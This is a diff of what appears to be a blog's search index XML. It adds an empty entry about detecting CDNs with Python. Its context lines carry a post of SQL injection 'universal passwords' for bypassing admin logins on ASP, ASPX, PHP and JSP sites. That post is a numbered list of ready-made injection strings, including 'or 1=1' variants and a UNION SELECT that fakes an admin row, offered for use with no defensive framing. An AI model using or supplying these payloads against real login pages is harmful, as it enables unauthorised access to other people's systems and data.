@@ -3,6 +3,13 @@
   
     
     <entry>
+      <title><![CDATA[Python实现CDN的判断]]></title>
+      <url>%2F2017%2F03%2F15%2FPython%E5%AE%9E%E7%8E%B0CDN%E7%9A%84%E5%88%A4%E6%96%AD%2F</url>
+      <content type="text"></content>
+    </entry>
+
+    
+    <entry>
       <title><![CDATA[后天登录万能密码]]></title>
       <url>%2F2017%2F03%2F14%2F%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%2F</url>
       <content type="text"><![CDATA[asp、aspx、php、jsp万能密码大全asp aspx万能密码 1： “or “a”=”a 2： ‘)or(‘a’=’a 3：or 1=1– 4：’or 1=1– 5：a’or’ 1=1– 6： “or 1=1– 7：’or’a’=’a 8： “or”=”a’=’a 9：’or’’=’ 10：’or’=’or’ 11: 1 or ‘1’=’1’=1 12: 1 or ‘1’=’1’ or 1=1 13: ‘OR 1=1%00 14: “or 1=1%00 15: ‘xor 16: 新型万能登陆密码 用户名 ‘ UNION Select 1,1,1 FROM admin Where ‘’=’ （替换表名admin） 密码 1 Username=-1%cf’ union select 1,1,1 as password,1,1,1 %23 Password=1 17: admin’ or ‘a’=’a 密码随便 PHP万能密码 ‘or’=’or’ ‘or 1=1/* 字符型 GPC是否开都可以使用 User: something Pass: ‘ OR ‘1’=’1 jsp 万能密码 1’or’1’=’1 admin’ OR 1=1/* 用户名：admin 系统存在这个用户的时候 才用得上 密码：1’or’1’=’1]]></content>
